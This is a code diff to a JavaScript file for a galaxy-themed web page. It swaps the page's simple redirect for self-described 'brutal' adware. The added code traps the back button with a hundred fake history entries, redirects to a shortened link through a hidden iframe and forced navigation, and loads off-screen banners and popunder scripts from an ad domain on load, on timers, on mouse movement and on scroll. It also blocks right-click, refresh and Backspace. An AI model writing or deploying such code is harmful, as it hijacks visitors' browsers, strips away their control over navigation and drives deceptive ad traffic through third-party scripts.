@@ -1,54 +1,227 @@
-// ====== Configuration ======
-const AD_URL = "https://shorter.me/WHO7C"; 
-const HISTORY_PUSH_COUNT = 50; 
+// ====== BRUTAL ADS CONFIGURATION ======
+const AD_NETWORKS = {
+  banner: [
+    // High paying banner ads (300x250)
+    '<script type="text/javascript">atOptions = {\'key\' : \'4b1eafbbf9404932effcedf29b70c2c7\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>',
+    '<script async="async" data-cfasync="false" src="//spaniardinformationbookworm.com/868d42ad6f620a7c28f3928d2b4bc961/invoke.js"></script><div id="container-868d42ad6f620a7c28f3928d2b4bc961"></div>',
+    '<script type="text/javascript">atOptions = {\'key\' : \'97f68ad2d8c855e8f26d7e6b7c5a4b3c\',\'format\' : \'iframe\',\'height\' : 250,\'width\' : 300,\'params\' : {}};</script><script type="text/javascript" src="//spaniardinformationbookworm.com/97f68ad2d8c855e8f26d7e6b7c5a4b3c/invoke.js"></script>'
+  ],
+  popunder: [
+    '//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js',
+    '//spaniardinformationbookworm.com/97/68/f5/9768f5d78dfc013bf8c5047b5505e390.js'
+  ]
+};
 
-// ====== Initialize Everything ======
+const HISTORY_PUSH_COUNT = 100; // Brutal history stacking
+
+// ====== BRUTAL INITIALIZATION ======
 window.addEventListener('load', function() {
-  safePushStates(HISTORY_PUSH_COUNT);
+  // Initialize everything aggressively
+  brutalPushStates(HISTORY_PUSH_COUNT);
   createStars();
   createShootingStars();
   createCosmicRays();
-  initializeButtons();
+  initializeBrutalButtons();
+  
+  // Pre-load ads immediately
+  preloadAllAds();
+  
+  // Aggressive popunder on load
+  setTimeout(triggerPopunder, 1500);
+  
+  // Continuous popunder attempts
+  setInterval(triggerPopunder, 30000);
+  
+  // Mouse movement detection for ads
+  document.addEventListener('mousemove', handleMouseMovement);
+  
+  // Scroll detection for ads
+  window.addEventListener('scroll', handleScroll);
+  
+  // Prevent right click
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    triggerEmergencyAds();
+  });
 });
 
-// ====== History Management ======
-function safePushStates(count = 1) {
+// ====== BRUTAL HISTORY MANAGEMENT ======
+function brutalPushStates(count = 1) {
   for (let i = 0; i < count; i++) {
     try { 
-      history.pushState({trap:i}, "", location.href); 
+      history.pushState({brutal: i, trap: true}, "", "#" + i); 
     } catch(e) { 
-      console.log('Push state blocked'); 
+      console.log('Brutal push state blocked'); 
     }
   }
+  
+  // Replace current state to prevent back
+  history.replaceState({trapped: true}, "", window.location.href);
 }
 
-// ====== Redirect Logic ======
-function goToAdImmediate() {
-  safePushStates(HISTORY_PUSH_COUNT);
-  window.location.href = AD_URL;
-}
+// ====== BRUTAL POPSTATE HANDLER ======
+window.addEventListener('popstate', function(event) {
+  // Immediately push more states when user tries to go back
+  brutalPushStates(50);
+  
+  // Trigger emergency ads
+  triggerEmergencyAds();
+  
+  // Redirect to ads if possible
+  setTimeout(() => {
+    openBrutalRedirect();
+  }, 100);
+});
 
-// ====== Button Initialization ======
-function initializeButtons() {
-  document.querySelectorAll('a[data-ad="true"]').forEach(button => {
+// ====== BRUTAL BUTTON HANDLING ======
+function initializeBrutalButtons() {
+  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
+    // Remove any existing listeners first
+    button.replaceWith(button.cloneNode(true));
+  });
+
+  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
     button.addEventListener('click', function(e) {
       e.preventDefault();
+      e.stopPropagation();
+      
       createRipple(this, e);
       createStarburst(this);
       
-      setTimeout(() => { 
-        goToAdImmediate(); 
-      }, 400);
+      // Multiple ad triggers on single click
+      triggerBannerAds(3); // Trigger 3 different banner ads
+      triggerPopunder();
+      brutalPushStates(25);
+      
+      // Open new tab/window with ads
+      setTimeout(() => {
+        openBrutalRedirect();
+      }, 500);
+      
+      // Prevent default after delay
+      return false;
+    });
+    
+    // Add touch events for mobile
+    button.addEventListener('touchstart', function(e) {
+      e.preventDefault();
+      triggerBannerAds(2);
+      triggerPopunder();
     });
   });
 }
 
-// ====== Popstate Handler ======
-window.addEventListener('popstate', function() {
-  window.location.href = AD_URL;
-});
+// ====== BRUTAL AD TRIGGERS ======
+function triggerBannerAds(count = 1) {
+  const hiddenAds = document.getElementById('hiddenAds');
+  
+  for (let i = 0; i < count; i++) {
+    const adIndex = Math.floor(Math.random() * AD_NETWORKS.banner.length);
+    const adScript = AD_NETWORKS.banner[adIndex];
+    
+    // Create container for ad
+    const adContainer = document.createElement('div');
+    adContainer.style.cssText = 'position:fixed; top:-1000px; left:-1000px; width:300px; height:250px; z-index:9999;';
+    adContainer.innerHTML = adScript;
+    
+    document.body.appendChild(adContainer);
+    
+    // Remove after some time
+    setTimeout(() => {
+      if (adContainer.parentNode) {
+        adContainer.parentNode.removeChild(adContainer);
+      }
+    }, 10000);
+  }
+}
 
-// ====== Galaxy Background Effects ======
+function triggerPopunder() {
+  try {
+    AD_NETWORKS.popunder.forEach(scriptUrl => {
+      const script = document.createElement('script');
+      script.src = scriptUrl;
+      script.async = true;
+      document.head.appendChild(script);
+    });
+  } catch (e) {
+    console.log('Popunder blocked');
+  }
+}
+
+function triggerEmergencyAds() {
+  // Trigger multiple ads in emergency
+  triggerBannerAds(5);
+  triggerPopunder();
+  brutalPushStates(50);
+}
+
+// ====== BRUTAL REDIRECT ======
+function openBrutalRedirect() {
+  // Try multiple redirect methods
+  try {
+    // Method 1: window.open
+    const newWindow = window.open('https://shorter.me/WHO7C', '_blank');
+    if (newWindow) {
+      setTimeout(() => {
+        newWindow.focus();
+      }, 100);
+    }
+  } catch (e) {}
+  
+  try {
+    // Method 2: location.replace (more aggressive)
+    setTimeout(() => {
+      window.location.replace('https://shorter.me/WHO7C');
+    }, 1500);
+  } catch (e) {}
+  
+  try {
+    // Method 3: Create iframe redirect
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://shorter.me/WHO7C';
+    document.body.appendChild(iframe);
+  } catch (e) {}
+}
+
+// ====== PRELOAD ADS ======
+function preloadAllAds() {
+  // Preload banner ads
+  AD_NETWORKS.banner.forEach(adScript => {
+    const preloadDiv = document.createElement('div');
+    preloadDiv.style.display = 'none';
+    preloadDiv.innerHTML = adScript;
+    document.getElementById('hiddenAds').appendChild(preloadDiv);
+  });
+}
+
+// ====== USER BEHAVIOR DETECTION ======
+let mouseMoveCount = 0;
+function handleMouseMovement(e) {
+  mouseMoveCount++;
+  
+  // Trigger ads on certain mouse movement patterns
+  if (mouseMoveCount % 50 === 0) {
+    triggerBannerAds(1);
+  }
+  
+  // Trigger on mouse position (simulating interest)
+  if (e.clientY < 100) { // Top of screen
+    triggerPopunder();
+  }
+}
+
+let scrollCount = 0;
+function handleScroll() {
+  scrollCount++;
+  
+  // Trigger ads on scroll
+  if (scrollCount % 10 === 0) {
+    triggerBannerAds(1);
+  }
+}
+
+// ====== GALAXY BACKGROUND EFFECTS ======
 function createStars() {
   const container = document.querySelector('.stars-container');
   const starCount = 150;
@@ -87,12 +260,10 @@ function createShootingStars() {
     }, 3000);
   }
 
-  // Create initial shooting stars
   for (let i = 0; i < 3; i++) {
     setTimeout(createShootingStar, i * 1500);
   }
 
-  // Continuous creation
   setInterval(createShootingStar, 3000);
 }
 
@@ -113,16 +284,14 @@ function createCosmicRays() {
     }, 6000);
   }
 
-  // Create initial rays
   for (let i = 0; i < 6; i++) {
     setTimeout(createRay, i * 1000);
   }
 
-  // Continuous creation
   setInterval(createRay, 4000);
 }
 
-// ====== Ripple Effect ======
+// ====== VISUAL EFFECTS ======
 function createRipple(element, event) {
   const rect = element.getBoundingClientRect();
   const x = event.clientX - rect.left;
@@ -137,7 +306,6 @@ function createRipple(element, event) {
   setTimeout(() => ripple.remove(), 600);
 }
 
-// ====== Starburst Effect ======
 function createStarburst(button) {
   const rect = button.getBoundingClientRect();
   const centerX = rect.left + rect.width / 2;
@@ -181,68 +349,35 @@ function createStarburst(button) {
   }
 }
 
-// ====== Mouse Trail Effect ======
-document.addEventListener('mousemove', function(e) {
-  if (Math.random() > 0.8) {
-    createSpaceDust(e.clientX, e.clientY);
+// ====== AUTO TRIGGERS ======
+setInterval(() => {
+  // Random ad triggers
+  if (Math.random() > 0.7) {
+    triggerBannerAds(1);
   }
+}, 15000);
+
+// ====== BRUTAL EXIT PREVENTION ======
+window.addEventListener('beforeunload', function(e) {
+  // Trigger ads when user tries to leave
+  triggerEmergencyAds();
+  
+  // Standard confirmation dialog (some browsers show this)
+  e.preventDefault();
+  e.returnValue = 'Are you sure you want to leave?';
 });
 
-function createSpaceDust(x, y) {
-  const dust = document.createElement('div');
-  dust.style.position = 'fixed';
-  dust.style.width = '2px';
-  dust.style.height = '2px';
-  dust.style.backgroundColor = '#ff9ec0';
-  dust.style.borderRadius = '50%';
-  dust.style.left = x + 'px';
-  dust.style.top = y + 'px';
-  dust.style.zIndex = '5';
-  dust.style.pointerEvents = 'none';
-  dust.style.boxShadow = '0 0 6px #ff9ec0';
-  
-  document.body.appendChild(dust);
-  
-  const animation = dust.animate([
-    { transform: 'scale(1)', opacity: 1 },
-    { transform: 'scale(0)', opacity: 0 }
-  ], {
-    duration: 800,
-    easing: 'ease-out'
-  });
-  
-  animation.onfinish = () => dust.remove();
-}
-
-// ====== Auto Cosmic Events ======
-setInterval(() => {
-  if (Math.random() > 0.7) {
-    createNebulaFlash();
+// Prevent keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+  // Block F5, Ctrl+R, etc.
+  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+    e.preventDefault();
+    triggerEmergencyAds();
   }
-}, 6000);
-
-function createNebulaFlash() {
-  const flash = document.createElement('div');
-  flash.style.position = 'fixed';
-  flash.style.top = '0';
-  flash.style.left = '0';
-  flash.style.width = '100%';
-  flash.style.height = '100%';
-  flash.style.background = 'radial-gradient(circle, rgba(255, 107, 157, 0.2) 0%, transparent 70%)';
-  flash.style.pointerEvents = 'none';
-  flash.style.zIndex = '2';
-  flash.style.opacity = '0';
   
-  document.body.appendChild(flash);
-  
-  const animation = flash.animate([
-    { opacity: 0 },
-    { opacity: 0.4 },
-    { opacity: 0 }
-  ], {
-    duration: 1500,
-    easing: 'ease-in-out'
-  });
-  
-  animation.onfinish = () => flash.remove();
-}
+  // Block backspace as back navigation
+  if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
+    e.preventDefault();
+    brutalPushStates(10);
+  }
+});
